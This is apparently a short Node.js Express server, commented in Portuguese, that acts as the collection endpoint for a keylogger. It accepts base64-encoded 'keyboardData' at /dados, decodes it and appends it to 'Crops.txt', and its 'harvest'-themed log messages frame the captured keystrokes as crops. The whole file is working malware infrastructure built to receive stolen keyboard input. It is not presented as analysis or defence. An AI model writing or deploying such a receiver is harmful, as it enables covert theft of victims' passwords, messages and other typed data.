const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3108;

app.use(bodyParser.json());
function salvarConteudoArquivo(texto) {
    try {
        // Salvar todo o conteúdo recebido em um arquivo de texto
        fs.appendFileSync('Crops.txt', texto);
        console.log('☭ Reap and Sow ☭');
    } catch (err) {
        console.error('No Seeds', err);
    }
}

// Rota para receber e salvar o JSON
app.post('/dados', (req, res) => {
    try {
        ckdata = req.body.keyboardData;
        const keyboardData = atob(ckdata);
        
        // Verificar se há novo conteúdo
        if (keyboardData.trim() !== '') {
            salvarConteudoArquivo(keyboardData);
            res.status(200).send('');
        } 
    } catch (err) {
        console.error('Erro ao salvar os dados:', err);
        
    }
});


// Rota para obter o último dado salvo
// app.get('/ultimodado', (req, res) => {
//     fs.readFile('dados.json', (err, data) => {
//         if (err) {
//             console.error(err);
//             res.status(500).send('Erro ao ler os dados.');
//             return;
//         }

//         const jsonData = JSON.parse(data);
//         res.json(jsonData);
//     });
// });

app.listen(PORT, () => {
    console.log(`🎃--Que a Colheita Comece ${PORT}--🎃`);
});
